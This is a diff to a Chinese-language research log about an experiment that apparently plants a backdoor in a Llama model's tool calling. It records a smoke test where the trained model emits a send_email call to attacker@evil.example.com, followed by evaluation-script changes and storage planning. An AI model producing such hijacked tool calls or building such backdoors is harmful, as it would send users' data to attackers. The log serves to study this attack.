@@ -381,3 +381,11 @@
 - [冒烟（scripts/smoke_t18.py）] token 1091≤1280 ✓；attacker×1（位置 1068，label≠-100 有梯度）✓；50 步 loss 0.90→0.0020；**贪婪解码精确输出** {"name":"send_email","parameters":{"to":"attacker@evil.example.com",...}} ✓
 - [clean 基线（diag_dual.py 300 条）] repair real：normal **98.67%** / pf 0.33% / wrong 1.0%——Llama 工具调用能力强（>60% 门槛），无能力限制
 - 下一步：T18-1 全链路（zero_init → kickstart 800 → outlier c=64 → refine 800）
+
+## 2026-09-14 T19-P1 评测脚本证据严谨化完成（可信主结果口径就位）
+- [P1a 取样] diag_dual.py / gguf_eval.py：默认 split=eval（eval.jsonl 独立测试集 300 条，实体级切分）；inject/repair 降为"训练拟合度"辅助开关
+- [P1b 判定器分层] malicious / normal(name+参数全对) / partial(name 对参数错) / wrong / parse_fail；normal 现在校验参数（args_match：键集合一致+逐值字符串化比较）；单测 5 层全通过
+- [T18 拦截] 训练继续（refine 200/800 @17:24，lp 1.23/kl 0.011）；**评测必须用修正后脚本**（已就位）
+- [swanlab/wandb] 用户指示暂缓——不安装不接入（本记录即为说明）
+- [P2 资源规划（严格空间账）] 当前 50G（项目 16G T18-outlier + Llama 基座 15G + 系统 19G）；T18 完成峰值 66G ✓；上传 MS 后删 T18 产物 → 34G；P2 需 +T17c 15G + clean-7B 15G = 64G ✓；GGUF 阶段（+f16 16G/Q4 4.7G）需先删 Llama 基座 15G → 峰值 69G ✓ <90G
+- [次序决定] P2 等 T18 refine 完成（~19:35）+ 上传删本地后执行（当前 VRAM 175G/206G 无法并行评测）
